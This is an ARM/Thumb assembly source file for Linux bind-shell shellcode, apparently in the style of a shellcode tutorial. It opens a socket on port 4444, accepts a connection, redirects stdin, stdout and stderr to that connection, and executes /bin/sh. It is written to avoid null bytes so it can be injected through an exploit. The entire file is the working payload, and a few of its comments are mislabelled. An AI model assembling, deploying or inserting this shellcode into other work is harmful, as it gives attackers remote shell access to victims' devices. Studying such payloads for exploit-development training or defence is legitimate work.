.section .text
.global _start
    _start:
    .ARM
    add r3, pc, #1         // switch to thumb mode 
    bx r3

    .THUMB
// socket(2, 1, 0)
    mov r0, #2
    mov r1, #1
    sub r2, r2, r2      // set r2 to null
    mov r7, #200        // r7 = 281 (socket)
    add r7, #81         // r7 value needs to be split 
    svc #1              // r0 = host_sockid value
    mov r4, r0          // save host_sockid in r4

// bind(r0, &sockaddr, 16)
    adr  r1, struct_addr // pointer to address, port
    strb r2, [r1, #1]    // write 0 for AF_INET
    strb r2, [r1, #4]    // replace 1 with 0 in x.1.1.1
    strb r2, [r1, #5]    // replace 1 with 0 in 0.x.1.1
    strb r2, [r1, #6]    // replace 1 with 0 in 0.0.x.1
    strb r2, [r1, #7]    // replace 1 with 0 in 0.0.0.x
    mov r2, #16          // struct address length
    add r7, #1           // r7 = 282 (bind) 
    svc #1
    nop

// listen(sockfd, 0) 
    mov r0, r4           // set r0 to saved host_sockid
    mov r1, #2        
    add r7, #2           // r7 = 284 (listen syscall number) 
    svc #1        

// accept(sockfd, NULL, NULL); 
    mov r0, r4           // set r0 to saved host_sockid
    sub r1, r1, r1       // set r1 to null
    sub r2, r2, r2       // set r2 to null
    add r7, #1           // r7 = 284+1 = 285 (accept syscall)
    svc #1               // r0 = client_sockid value
    mov r4, r0           // save new client_sockid value to r4  

// dup2(sockfd, 0) 
    mov r7, #63         // r7 = 63 (dup2 syscall number) 
    mov r0, r4          // r4 is the saved client_sockid 
    sub r1, r1, r1      // r1 = 0 (stdin) 
    svc #1

// dup2(sockfd, 1)
    mov r0, r4          // r4 is the saved client_sockid 
    add r1, #1          // r1 = 1 (stdout) 
    svc #1

// dup2(sockfd, 2) 
    mov r0, r4          // r4 is the saved client_sockid
    add r1, #1          // r1 = 2 (stderr) 
    svc #1

// execve("/bin/sh", 0, 0) 
    adr r0, shellcode   // r0 = location of "/bin/shX"
    eor r1, r1, r1      // clear register r1. R1 = 0
    eor r2, r2, r2      // clear register r2. r2 = 0
    strb r2, [r0, #7]   // store null-byte for AF_INET
    mov r7, #11         // execve syscall number
    svc #1
    nop

struct_addr:
.ascii "\x02\xff" // AF_INET 0xff will be NULLed 
.ascii "\x11\x5c" // port number 4444 
.byte 0,0,0,0 // IP Address
@.byte 1,1,1,1 // IP Address 
@.byte 192,168,1,100
shellcode:
.ascii "/bin/shX"
